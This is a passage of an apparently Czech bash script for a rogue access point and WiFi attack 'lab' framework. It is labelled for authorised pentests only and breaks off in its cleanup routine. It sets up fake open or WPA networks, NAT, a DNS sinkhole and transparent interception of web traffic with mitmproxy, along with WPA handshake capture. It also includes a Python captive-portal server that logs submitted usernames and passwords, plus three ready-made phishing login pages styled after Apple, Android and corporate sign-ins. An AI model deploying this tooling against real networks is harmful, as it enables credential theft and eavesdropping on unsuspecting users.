#!/bin/bash
###############################################################################
#
#    .---,      K U K A Č K A P
#   ( o   \>    Rogue AP & WiFi Lab Framework  v1.4.1
#   ( ~~~  )    "Cizí hnízdo, naše vejce."
#    '----'
#    /|  |\     POUZE pro vlastní zařízení nebo autorizovaný pentest!
#
###############################################################################

# === KONFIGURACE ===
AP_IFACE="${AP_IFACE:-wlx00c0cab83466}"
UPSTREAM="${UPSTREAM:-wlan0}"
SSID="${SSID:-FreeWifi}"
CHANNEL="${CHANNEL:-6}"
AP_IP="10.0.0.1"
DHCP_RANGE="10.0.0.10,10.0.0.50,12h"
MULTI_IFACE2="${AP_IFACE}v1"
MULTI_AP_IP2="10.0.1.1"
MULTI_DHCP_RANGE2="10.0.1.10,10.0.1.50,12h"
WORK_DIR="/tmp/kukackap"
LOG_DIR="$WORK_DIR/logs"

# === BARVY ===
R=$'\033[0;31m'; G=$'\033[0;32m'; Y=$'\033[1;33m'; B=$'\033[0;34m'
C=$'\033[0;36m'; M=$'\033[0;35m'; W=$'\033[1;37m'; N=$'\033[0m'
BOLD=$'\033[1m'

# === RECOVERY DISPLAY POD SUDO ===
recover_user_env() {
    [ -z "$SUDO_USER" ] && return
    local pid env_file val
    # Hledáme user session - zkusíme v pořadí různé procesy
    for proc_pattern in gnome-shell plasmashell xfce4-session mate-session lxsession Xwayland Xorg; do
        pid=$(pgrep -u "$SUDO_USER" -x "$proc_pattern" 2>/dev/null | head -1)
        [ -z "$pid" ] && pid=$(pgrep -u "$SUDO_USER" -f "$proc_pattern" 2>/dev/null | head -1)
        [ -n "$pid" ] && break
    done
    [ -z "$pid" ] && return
    env_file="/proc/$pid/environ"
    [ -r "$env_file" ] || return
    for var in DISPLAY WAYLAND_DISPLAY XAUTHORITY XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS; do
        val=$(tr '\0' '\n' < "$env_file" 2>/dev/null | grep "^${var}=" | head -1 | cut -d= -f2-)
        [ -n "$val" ] && export "$var=$val"
    done
}
recover_user_env

# === DETEKCE TERMINÁLU ===
detect_terminal() {
    if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
        for term in ptyxis kgx gnome-terminal xfce4-terminal konsole mate-terminal lxterminal terminator tilix alacritty kitty xterm; do
            command -v "$term" &>/dev/null && { echo "$term"; return; }
        done
    fi
    command -v tmux &>/dev/null && { echo "tmux"; return; }
    echo "none"
}
TERM_CMD=$(detect_terminal)

# === SPOUŠTĚČ NOVÝCH OKEN (přepsáno na robustnější) ===
open_term() {
    local title="$1"
    local cmd="$2"
    # Skript pro spuštění v okně - uložíme do souboru, ať se vyhneme escapingu
    local script_file="$WORK_DIR/.term_$$_${RANDOM}.sh"
    mkdir -p "$WORK_DIR"
    cat > "$script_file" <<EOF
#!/bin/bash
echo -e "${C}╔═══ $title ═══╗${N}"
$cmd
echo
echo -e "${Y}[ENTER pro zavření okna]${N}"
read
EOF
    chmod +x "$script_file"

    case "$TERM_CMD" in
        ptyxis)
            # Ptyxis - GNOME nový terminál (sudo problémy s D-Bus, raději přes user)
            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
                sudo -u "$SUDO_USER" \
                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
                    ptyxis --new-window --title="$title" -- bash "$script_file" &
            else
                ptyxis --new-window --title="$title" -- bash "$script_file" &
            fi
            ;;
        kgx)
            # GNOME Console
            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
                sudo -u "$SUDO_USER" \
                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
                    kgx --title="$title" -e "bash $script_file" &
            else
                kgx --title="$title" -e "bash $script_file" &
            fi
            ;;
        gnome-terminal)
            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
                sudo -u "$SUDO_USER" \
                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
                    gnome-terminal --title="$title" -- bash "$script_file" &
            else
                gnome-terminal --title="$title" -- bash "$script_file" &
            fi
            ;;
        xfce4-terminal)
            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
                sudo -u "$SUDO_USER" \
                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
                    XAUTHORITY="$XAUTHORITY" \
                    xfce4-terminal --title="$title" --command="bash $script_file" &
            else
                xfce4-terminal --title="$title" --command="bash $script_file" &
            fi
            ;;
        konsole)
            konsole --new-tab -p "tabtitle=$title" -e bash "$script_file" &
            ;;
        tilix)
            tilix --title="$title" -e "bash $script_file" &
            ;;
        alacritty)
            alacritty --title "$title" -e bash "$script_file" &
            ;;
        kitty)
            kitty --title "$title" bash "$script_file" &
            ;;
        mate-terminal|lxterminal|terminator)
            "$TERM_CMD" --title="$title" -e "bash $script_file" &
            ;;
        xterm)
            xterm -T "$title" -e "bash $script_file" &
            ;;
        tmux)
            if ! tmux has-session -t kukackap 2>/dev/null; then
                tmux new-session -d -s kukackap -n "$title" "bash $script_file"
            else
                tmux new-window -t kukackap -n "$title" "bash $script_file"
            fi
            ;;
        none)
            mkdir -p "$LOG_DIR"
            (cd / && bash -c "$cmd" >> "$LOG_DIR/${title}.log" 2>&1) &
            echo "  ${Y}[>] Spuštěno na pozadí: $title (log: $LOG_DIR/${title}.log)${N}"
            ;;
    esac
    sleep 0.4
}

attach_tmux_if_needed() {
    if [ "$TERM_CMD" = "tmux" ]; then
        echo "${G}[+] tmux session 'kukackap' běží${N}"
        echo "${Y}    Připoj se: ${W}tmux attach -t kukackap${N}"
        echo "${Y}    Mezi okny: Ctrl+B  N (next) / P (prev) / 0..9 (číslo)${N}"
        echo "${Y}    Detach:    Ctrl+B  D${N}"
    fi
}

# === HELPERS ===
need_root() {
    [ "$EUID" -ne 0 ] && { echo "${R}[!] Spouštěj jako root (sudo)${N}"; exit 1; }
}
check_tool() { command -v "$1" &>/dev/null; }

banner() {
    clear
    printf "%s" "${C}"
    cat <<'EOF'
  ██╗  ██╗██╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗ █████╗  █████╗ ██████╗
  ██║ ██╔╝██║   ██║██║ ██╔╝██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗
  █████╔╝ ██║   ██║█████╔╝ ███████║██║     █████╔╝ ███████║███████║██████╔╝
  ██╔═██╗ ██║   ██║██╔═██╗ ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██║██╔═══╝
  ██║  ██╗╚██████╔╝██║  ██╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║██║
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
EOF
    printf "%s\n" "${N}${BOLD}            Rogue AP & WiFi Lab Framework  v1.4.1${N}"
    printf "%s\n\n" "${M}                  \"Cizí hnízdo, naše vejce.\"${N}"

    # Kukačka z profilu — kulatá hlava + zobák vpravo (žádné kočičí uši)
    local B1='  .---,   ' B2=' ( o   \> ' B3=' ( ~~~  ) ' B4="  '----'  " B5='  /|  |\\  '
    printf "%s%s%s  %sAP iface  :%s %s%s%s\n" "$C" "$B1" "$N" "$W" "$N" "$G" "$AP_IFACE" "$N"
    printf "%s%s%s  %sUpstream  :%s %s%s%s\n" "$C" "$B2" "$N" "$W" "$N" "$G" "$UPSTREAM" "$N"
    printf "%s%s%s  %sSSID      :%s %s%s%s    %sKanál:%s %s%s%s\n" "$C" "$B3" "$N" "$W" "$N" "$G" "$SSID" "$N" "$W" "$N" "$G" "$CHANNEL" "$N"
    printf "%s%s%s  %sTerminál  :%s %s%s%s\n" "$C" "$B4" "$N" "$W" "$N" "$G" "$TERM_CMD" "$N"
    printf "%s%s%s  %sWorkDir   :%s %s%s%s\n" "$C" "$B5" "$N" "$W" "$N" "$G" "$WORK_DIR" "$N"
    if [ "$TERM_CMD" = "none" ]; then
        printf "\n  %s[!] Žádný GUI terminál nedetekován.%s\n" "$Y" "$N"
        printf "      %sZkus:  sudo -E bash kukackap.sh%s\n" "$W" "$N"
        printf "      %snebo:  sudo apt install tmux%s\n" "$W" "$N"
    fi
    echo
}

# === ZMĚNA NASTAVENÍ ===
mode_settings() {
    while true; do
        clear
        banner
        printf "${C}┌──── Nastavení ────┐${N}\n"
        printf "${C}│${N}  ${G}1)${N} Změnit SSID (aktuálně: ${G}$SSID${N})\n"
        printf "${C}│${N}  ${G}2)${N} Změnit kanál (aktuálně: ${G}$CHANNEL${N})\n"
        printf "${C}│${N}  ${G}3)${N} Změnit AP rozhraní (aktuálně: ${G}$AP_IFACE${N})\n"
        printf "${C}│${N}  ${G}4)${N} Změnit upstream (aktuálně: ${G}$UPSTREAM${N})\n"
        printf "${C}│${N}  ${W}b)${N} Zpět\n"
        printf "${C}└───────────────────┘${N}\n\n"
        read -p "$(printf "%snastavení%s❯ " "$BOLD" "$N")" sub
        case "$sub" in
            1)
                read -p "Nový SSID [${SSID}]: " new
                [ -n "$new" ] && SSID="$new"
                echo "${G}[+] SSID = $SSID${N}"; sleep 1
                ;;
            2)
                echo "  Doporučené kanály 2.4 GHz: 1, 6, 11"
                echo "  Pro 5 GHz (pokud karta umí): 36, 40, 44, 48"
                read -p "Nový kanál [${CHANNEL}]: " new
                [ -n "$new" ] && CHANNEL="$new"
                echo "${G}[+] Kanál = $CHANNEL${N}"; sleep 1
                ;;
            3)
                pick_ap_iface
                ;;
            4)
                pick_upstream
                ;;
            b|B|"") return ;;
        esac
    done
}

# === PICKER PRO AP ROZHRANÍ ===
pick_ap_iface() {
    clear
    printf "${C}═══ Výběr AP rozhraní ═══${N}\n\n"
    printf "${W}#  Rozhraní               Typ        AP-mode  Driver        Stav${N}\n"
    printf "${W}─────────────────────────────────────────────────────────────────${N}\n"

    # Sesbírej všechny WiFi karty
    local ifaces=()
    local i=0
    while read -r ifname; do
        [ -z "$ifname" ] && continue
        ifaces+=("$ifname")
        i=$((i+1))

        local phy=$(iw dev "$ifname" info 2>/dev/null | awk '/wiphy/ {print "phy"$2}')
        local type=$(iw dev "$ifname" info 2>/dev/null | awk '/type/ {print $2}')
        local driver=$(basename "$(readlink /sys/class/net/$ifname/device/driver 2>/dev/null)" 2>/dev/null)
        [ -z "$driver" ] && driver="?"

        # Umí AP mode?
        local has_ap="${R}NE${N}"
        if [ -n "$phy" ] && iw "$phy" info 2>/dev/null | grep -A20 "Supported interface modes" | grep -q "* AP"; then
            has_ap="${G}ANO${N}"
        fi

        # Stav
        local state=$(ip -br link show "$ifname" 2>/dev/null | awk '{print $2}')
        local current=""
        [ "$ifname" = "$AP_IFACE" ] && current=" ${Y}[aktuální]${N}"

        printf "${G}%2d)${N} %-22s %-10s %-8b %-13s %s%b\n" \
            "$i" "$ifname" "$type" "$has_ap" "$driver" "$state" "$current"
    done < <(iw dev 2>/dev/null | awk '/Interface/ {print $2}')

    if [ ${#ifaces[@]} -eq 0 ]; then
        echo "${R}[!] Nenalezena žádná WiFi karta${N}"
        sleep 2
        return
    fi

    echo
    printf "${W}Tip:${N} Vyber rozhraní s ${G}AP-mode=ANO${N}. Karty s 'monitor' typem nejprve resetuj.\n"
    echo
    read -p "Vyber číslo [Enter = ponechat]: " num
    if [[ "$num" =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le ${#ifaces[@]} ]; then
        AP_IFACE="${ifaces[$((num-1))]}"
        echo "${G}[+] AP iface = $AP_IFACE${N}"
        sleep 1
    fi
}

# === PICKER PRO UPSTREAM ===
pick_upstream() {
    clear
    printf "${C}═══ Výběr upstream rozhraní (zdroj internetu) ═══${N}\n\n"
    printf "${W}#  Rozhraní        Typ       Stav        IP                   Konektivita${N}\n"
    printf "${W}─────────────────────────────────────────────────────────────────────────${N}\n"

    local ifaces=()
    local i=0

    # Sesbírej všechna nelokal rozhraní (Ethernet + WiFi v managed/spojená)
    while read -r ifname state; do
        [ "$ifname" = "lo" ] && continue
        [ -z "$ifname" ] && continue
        # Skip AP rozhraní samotné
        [ "$ifname" = "$AP_IFACE" ] && continue
        # Skip virtuální/docker/atd
        case "$ifname" in
            veth*|docker*|br-*|virbr*|tun*|tap*|wg*) continue ;;
        esac

        ifaces+=("$ifname")
        i=$((i+1))

        # Zjisti typ
        local iftype="ether"
        if iw dev "$ifname" info &>/dev/null; then
            iftype="wifi"
            local wtype=$(iw dev "$ifname" info | awk '/type/ {print $2}')
            [ -n "$wtype" ] && iftype="wifi/$wtype"
        fi

        # IP adresa
        local ipaddr=$(ip -4 addr show "$ifname" 2>/dev/null | awk '/inet / {print $2; exit}')
        [ -z "$ipaddr" ] && ipaddr="-"

        # Konektivita - test default route
        local conn="${R}NE${N}"
        local def_via=$(ip route show default 2>/dev/null | awk -v ifn="$ifname" '$0 ~ "dev "ifn" " {print $3; exit}')
        if [ -n "$def_via" ]; then
            conn="${G}internet${N}"
        elif [ "$ipaddr" != "-" ]; then
            conn="${Y}lokální${N}"
        fi

        local current=""
        [ "$ifname" = "$UPSTREAM" ] && current=" ${Y}[aktuální]${N}"

        printf "${G}%2d)${N} %-15s %-9s %-11s %-20s %b%b\n" \
            "$i" "$ifname" "$iftype" "$state" "$ipaddr" "$conn" "$current"
    done < <(ip -br link show | awk '{print $1, $2}')

    if [ ${#ifaces[@]} -eq 0 ]; then
        echo "${R}[!] Žádné použitelné upstream rozhraní${N}"
        sleep 2
        return
    fi

    echo
    printf "${W}Tip:${N} Vyber rozhraní s ${G}internet${N} pro NAT. Pro lab bez internetu klidně lokální.\n"
    echo
    read -p "Vyber číslo [Enter = ponechat]: " num
    if [[ "$num" =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le ${#ifaces[@]} ]; then
        UPSTREAM="${ifaces[$((num-1))]}"
        echo "${G}[+] Upstream = $UPSTREAM${N}"
        sleep 1
    fi
}

prepare_iface() {
    echo "${Y}[*] Příprava rozhraní $AP_IFACE${N}"
    rfkill unblock wifi 2>/dev/null || true
    systemctl stop firewalld 2>/dev/null || true
    pkill hostapd 2>/dev/null || true
    pkill -f "dnsmasq -C $WORK_DIR" 2>/dev/null || true
    pkill mitmweb 2>/dev/null || true
    pkill -f "$WORK_DIR/portal.py" 2>/dev/null || true
    pkill airbase-ng 2>/dev/null || true
    sleep 1
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type __ap 2>/dev/null || true
    ip link set "$AP_IFACE" up
    ip addr flush dev "$AP_IFACE" 2>/dev/null || true
    ip addr add "$AP_IP/24" dev "$AP_IFACE"
    mkdir -p "$WORK_DIR" "$LOG_DIR"
    echo "${G}[+] Rozhraní připraveno${N}"
}

write_hostapd_open() {
    local s="${1:-$SSID}"
    local b="${2:-}"
    local bssid_line=""
    [ -n "$b" ] && bssid_line="bssid=$b"
    cat > "$WORK_DIR/ap.conf" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$s
$bssid_line
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
EOF
}

write_hostapd_wpa2() {
    cat > "$WORK_DIR/ap.conf" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$1
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
}

write_hostapd_wpa3() {
    cat > "$WORK_DIR/ap.conf" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2
sae_password=$1
EOF
}

write_hostapd_multi() {
    local ssid1="$1" ssid2="$2" pass2="$3"
    {
        cat <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$ssid1
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0

bss=$MULTI_IFACE2
ssid=$ssid2
auth_algs=1
ignore_broadcast_ssid=0
EOF
        if [ -n "$pass2" ]; then
            cat <<EOF
wpa=2
wpa_passphrase=$pass2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
        fi
    } > "$WORK_DIR/ap.conf"
}

write_dnsmasq_multi() {
    cat > "$WORK_DIR/dnsmasq.conf" <<EOF
interface=$AP_IFACE
interface=$MULTI_IFACE2
bind-interfaces
port=0
dhcp-range=set:primary,$DHCP_RANGE
dhcp-range=set:secondary,$MULTI_DHCP_RANGE2
dhcp-option=tag:primary,option:router,$AP_IP
dhcp-option=tag:secondary,option:router,$MULTI_AP_IP2
dhcp-option=6,1.1.1.1,8.8.8.8
dhcp-authoritative
log-dhcp
log-facility=$LOG_DIR/dnsmasq.log
EOF
}

setup_nat_multi() {
    echo "${Y}[*] NAT přes $UPSTREAM (multi-SSID)${N}"
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    iptables -t nat -F
    iptables -F FORWARD
    iptables -t nat -A POSTROUTING -o "$UPSTREAM" -j MASQUERADE
    for iface in "$AP_IFACE" "$MULTI_IFACE2"; do
        iptables -A FORWARD -i "$iface" -o "$UPSTREAM" -j ACCEPT
        iptables -A FORWARD -i "$UPSTREAM" -o "$iface" -m state --state RELATED,ESTABLISHED -j ACCEPT
    done
}

write_dnsmasq() {
    cat > "$WORK_DIR/dnsmasq.conf" <<EOF
interface=$AP_IFACE
bind-interfaces
port=0
dhcp-range=$DHCP_RANGE
dhcp-option=3,$AP_IP
dhcp-option=6,1.1.1.1,8.8.8.8
dhcp-authoritative
log-dhcp
log-facility=$LOG_DIR/dnsmasq.log
EOF
}

write_dnsmasq_sinkhole() {
    cat > "$WORK_DIR/dnsmasq.conf" <<EOF
interface=$AP_IFACE
bind-interfaces
listen-address=$AP_IP
no-resolv
address=/#/$AP_IP
dhcp-range=$DHCP_RANGE
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
dhcp-authoritative
log-queries
log-dhcp
log-facility=$LOG_DIR/dnsmasq.log
EOF
}

setup_nat() {
    echo "${Y}[*] NAT přes $UPSTREAM${N}"
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    iptables -t nat -F
    iptables -F FORWARD
    iptables -t nat -A POSTROUTING -o "$UPSTREAM" -j MASQUERADE
    iptables -A FORWARD -i "$AP_IFACE" -o "$UPSTREAM" -j ACCEPT
    iptables -A FORWARD -i "$UPSTREAM" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
}

setup_mitm_redirect() {
    iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
}

write_captive_portal_server() {
    cat > "$WORK_DIR/portal.py" <<'PYEOF'
#!/usr/bin/env python3
import http.server, socketserver, urllib.parse, datetime, sys
PORT = 80
LOG      = sys.argv[1] if len(sys.argv) > 1 else "/tmp/kukackap/logs/portal.log"
HTML_SRC = sys.argv[2] if len(sys.argv) > 2 else "/tmp/kukackap/portal.html"
with open(HTML_SRC, encoding='utf-8') as _f:
    HTML = _f.read()
SUCCESS = '<html><body style="font-family:system-ui;text-align:center;padding:60px;background:#f5f5f7"><h2>&#10003; Connected</h2><p style="color:#86868b">You may close this window.</p></body></html>'
class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    def send_html(self, body, status=200):
        b = body.encode()
        self.send_response(status); self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self): self.send_html(HTML)
    def do_POST(self):
        ln = int(self.headers.get('Content-Length','0'))
        data = self.rfile.read(ln).decode('utf-8', errors='replace')
        params = urllib.parse.parse_qs(data)
        u = params.get('user',[''])[0]; p = params.get('pass',[''])[0]
        client = self.client_address[0]
        ts = datetime.datetime.now().isoformat(timespec='seconds')
        ua = self.headers.get('User-Agent','-')
        line = f"[{ts}] {client} | user={u!r} pass={p!r} | UA={ua}"
        print(line, flush=True)
        try:
            with open(LOG,'a') as f: f.write(line+'\n')
        except: pass
        self.send_html(SUCCESS)
socketserver.TCPServer.allow_reuse_address = True
print(f"[*] Portal :{PORT}  tmpl:{HTML_SRC}  log:{LOG}", flush=True)
with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
    try: s.serve_forever()
    except KeyboardInterrupt: pass
PYEOF
    chmod +x "$WORK_DIR/portal.py"
}

write_portal_html_apple() {
    cat > "$WORK_DIR/portal.html" <<'EOF'
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Sign-in</title><style>
body{font-family:-apple-system,system-ui,sans-serif;background:#f5f5f7;margin:0;padding:20px;color:#1d1d1f}
.box{max-width:380px;margin:60px auto;background:#fff;padding:32px;border-radius:18px;box-shadow:0 4px 20px rgba(0,0,0,.08)}
h1{font-size:22px;margin:0 0 8px}p{color:#86868b;margin:0 0 24px}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #d2d2d7;border-radius:10px;font-size:16px;box-sizing:border-box;outline:none}
input:focus{border-color:#0071e3}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:0;border-radius:10px;font-size:17px;font-weight:500;margin-top:14px;cursor:pointer}
.logo{font-size:36px;text-align:center;margin-bottom:10px}
.terms{font-size:12px;color:#86868b;margin-top:16px;text-align:center}
</style></head><body><div class="box">
<div class="logo">&#128246;</div><h1>Connect to WiFi</h1>
<p>Sign in to access the internet.</p>
<form method="POST" action="/login">
<input name="user" placeholder="Email or username" required autocomplete="email">
<input name="pass" type="password" placeholder="Password" required autocomplete="current-password">
<button type="submit">Continue</button></form>
<div class="terms">By connecting, you agree to the Terms of Use.</div>
</div></body></html>
EOF
}

write_portal_html_android() {
    cat > "$WORK_DIR/portal.html" <<'EOF'
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to network</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Roboto,sans-serif;background:#fef7ff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:28px;padding:32px 28px;max-width:400px;width:100%;box-shadow:0 2px 16px rgba(0,0,0,.08)}
.icon{width:52px;height:52px;background:#e8def8;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:26px;margin-bottom:20px}
h1{font-size:24px;color:#1c1b1f;margin-bottom:6px}
.sub{color:#49454f;font-size:14px;margin-bottom:28px}
.field{position:relative;margin-bottom:16px}
.field input{width:100%;padding:16px 14px;border:1px solid #79747e;border-radius:4px;font-size:16px;outline:none;background:transparent}
.field input:focus{border:2px solid #6750a4}
button{width:100%;padding:14px;background:#6750a4;color:#fff;border:0;border-radius:100px;font-size:14px;font-weight:500;letter-spacing:.05em;cursor:pointer;margin-top:8px}
.terms{font-size:12px;color:#49454f;text-align:center;margin-top:18px}
</style></head><body><div class="card">
<div class="icon">&#128225;</div>
<h1>Sign in to network</h1>
<div class="sub">Enter your credentials to get online</div>
<form method="POST" action="/login">
<div class="field"><input name="user" type="text" placeholder="Email or username" required autocomplete="email"></div>
<div class="field"><input name="pass" type="password" placeholder="Password" required autocomplete="current-password"></div>
<button type="submit">Sign in</button></form>
<div class="terms">By signing in, you agree to the network usage policy.</div>
</div></body></html>
EOF
}

write_portal_html_corp() {
    cat > "$WORK_DIR/portal.html" <<'EOF'
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Corporate Network Access</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1e3a5f,#0d2137);min-height:100vh;display:flex;flex-direction:column}
header{background:rgba(255,255,255,.06);padding:14px 28px;display:flex;align-items:center;gap:12px;border-bottom:1px solid rgba(255,255,255,.1)}
.logo{width:34px;height:34px;background:#0078d4;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px}
.brand{color:#fff;font-size:15px;font-weight:600}
.brand small{display:block;font-size:11px;color:rgba(255,255,255,.45);font-weight:400}
main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:3px;padding:36px;max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.3)}
h2{font-size:19px;color:#1e1e1e;margin-bottom:6px}
.sub{font-size:13px;color:#605e5c;margin-bottom:22px}
.notice{background:#fff4e5;border-left:3px solid #f7630c;padding:9px 12px;font-size:12px;color:#6a3d00;margin-bottom:22px;border-radius:1px}
label{display:block;font-size:11px;font-weight:700;color:#323130;margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em}
input[type=text],input[type=password]{width:100%;padding:9px 11px;border:1px solid #8a8886;border-radius:2px;font-size:14px;margin-bottom:16px;outline:none}
input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}
.agree{display:flex;gap:8px;margin-bottom:22px;font-size:12px;color:#605e5c;align-items:flex-start}
.agree input{margin-top:2px;flex-shrink:0}
button{width:100%;padding:9px;background:#0078d4;color:#fff;border:0;border-radius:2px;font-size:14px;font-weight:600;cursor:pointer}
footer{text-align:center;padding:14px;font-size:11px;color:rgba(255,255,255,.35)}
</style></head><body>
<header><div class="logo">&#127760;</div><div class="brand">Corporate Network<small>Secure Access Gateway</small></div></header>
<main><div class="card">
<h2>Network Authentication Required</h2>
<div class="sub">Enter your corporate credentials to access the network.</div>
<div class="notice">&#9432; This connection is monitored and logged for security purposes.</div>
<form method="POST" action="/login">
<label>Username / Email</label>
<input name="user" type="text" placeholder="firstname.lastname@company.com" required autocomplete="username">
<label>Password</label>
<input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required autocomplete="current-password">
<div class="agree"><input type="checkbox" required id="tc"><label for="tc">I agree to the Acceptable Use Policy and understand that activity is monitored.</label></div>
<button type="submit">Sign in to Network</button>
</form></div></main>
<footer>IT Security &mdash; Unauthorized access is prohibited</footer>
</body></html>
EOF
}

# Zpětná kompatibilita — při přímém volání použij Apple šablonu
write_captive_portal() {
    write_captive_portal_server
    write_portal_html_apple
}

# === LAUNCHERS ===
launch_hostapd() {
    open_term "hostapd" "sudo hostapd $WORK_DIR/ap.conf 2>&1 | tee $LOG_DIR/hostapd.log"
    sleep 2
}
launch_dnsmasq() {
    open_term "dnsmasq" "sudo dnsmasq -C $WORK_DIR/dnsmasq.conf -d 2>&1 | tee -a $LOG_DIR/dnsmasq-stdout.log"
    sleep 1
}
launch_tcpdump() {
    local pcap="$LOG_DIR/capture-$(date +%H%M%S).pcap"
    open_term "tcpdump" "echo Soubor: $pcap; sudo tcpdump -i $AP_IFACE -w $pcap -U -v"
    echo "$pcap" > "$WORK_DIR/last_pcap"
}
launch_leases() {
    open_term "leases" "sudo touch $LOG_DIR/dnsmasq.log; sudo tail -F $LOG_DIR/dnsmasq.log | grep --line-buffered -E 'DHCP(DISCOVER|OFFER|REQUEST|ACK)'"
}
launch_dnsqueries() {
    open_term "dns-queries" "sudo touch $LOG_DIR/dnsmasq.log; sudo tail -F $LOG_DIR/dnsmasq.log | grep --line-buffered query"
}
launch_mitm() {
    open_term "mitmweb" "echo UI: http://$AP_IP:8081; mitmweb --mode transparent --showhost --set web_host=0.0.0.0 --set web_port=8081 --set confdir=$WORK_DIR/mitm 2>&1 | tee $LOG_DIR/mitm.log"
}
launch_portal() {
    open_term "portal" "sudo python3 $WORK_DIR/portal.py $LOG_DIR/credentials.log $WORK_DIR/portal.html 2>&1 | tee $LOG_DIR/portal.log"
}
launch_eapol_capture() {
    open_term "eapol-capture" "sudo tcpdump -i $AP_IFACE -w $LOG_DIR/eapol-$(date +%H%M%S).pcap 'ether proto 0x888e' -v"
}

# === CLEANUP ===
cleanup() {
    echo
    echo "${Y}[*] Cleanup...${N}"
    pkill hostapd 2>/dev/null || true
    pkill hostapd-wpe 2>/dev/null || true
    pkill -f "dnsmasq -C $WORK_DIR" 2>/dev/null || true
    pkill mitmweb 2>/dev/null || true
    pkill -f "$WORK_DIR/portal.py" 2>/dev/null || true
    pkill airbase-ng 2>/dev/null || true
    pkill -f "tcpdump -i $AP_IFACE" 2>/dev/null || true
    pkill -f "aireplay-ng.*deauth" 2>/dev/null || true
    pkill hcxdumptool 2>/dev/null || true
    pkill mdk4 2>/dev/null || true
    pkill reaver 2>/dev/null || true
    pkill bully 2>/dev/null || true
    pkill -f "$WORK_DIR/chanhop.sh" 2>/dev/null || true
    pkill -f "$WORK_DIR/clients.sh" 2>/dev/null || true
    iptables -t nat -F
    iptables -F FORWARD
    ip addr flush dev "$AP_IFACE" 2>/dev/null || true
    ip link set "$AP_IFACE" down 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed yes 2>/dev/null || true
